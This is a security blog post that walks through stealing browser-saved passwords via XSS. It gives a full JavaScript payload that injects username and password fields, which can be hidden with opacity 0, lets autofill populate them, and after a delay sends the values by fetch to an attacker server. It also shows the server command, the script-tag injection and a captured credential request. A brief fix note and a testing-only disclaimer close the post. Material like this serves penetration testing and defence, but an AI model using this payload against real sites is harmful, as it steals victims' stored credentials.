---
layout: single
title: "XSS — Stealing Browser-Saved Passwords"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - credential-theft
  - password-theft
  - autofill-attack
  - javascript
  - stored-xss
  - dom-manipulation
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "Inject hidden username and password fields into the DOM — browsers auto-fill them with saved credentials. A delayed fetch sends those credentials to your server before the victim notices anything."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## The Attack

Browsers auto-fill saved credentials into `type="password"` fields. If you can inject those fields via XSS, the browser fills them in — and your script reads them before the victim does anything.

## Step-by-Step

**Step 1 — Create `xss.js`:**

```javascript
let body = document.getElementsByTagName("body")[0]

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
// u.style.opacity = "0";  // set to 0 to make invisible

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
// p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function() {
    fetch("http://192.168.XX.XX/k?u=" + u.value + "&p=" + p.value)
}, 5000);
```

**Step 2 — Start server:**

<div class="tool-cmd">python3 -m http.server 80</div>

**Step 3 — Submit the injection:**

```html
<script src="http://192.168.XX.XX/xss.js"></script>
```

## What Happens

The hidden fields render on the page. The browser's autofill kicks in and populates them with the saved username and password for that domain. After 5 seconds, your script fires and sends both values to your server.

<div class="tool-out">GET /k?u=admin&p=SuperSecretP%40ss123 HTTP/1.1</div>

## Why opacity:0 Matters

Setting opacity to 0 makes the fields invisible to the user while the browser still auto-fills them. For a PoC, leave it commented out to see the fields appear.

<div class="remediation-box"><strong>Fix:</strong> Browsers are improving autofill heuristics — but the real fix is preventing XSS in the first place. Validate and encode all output. Use CSP to block injected scripts.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
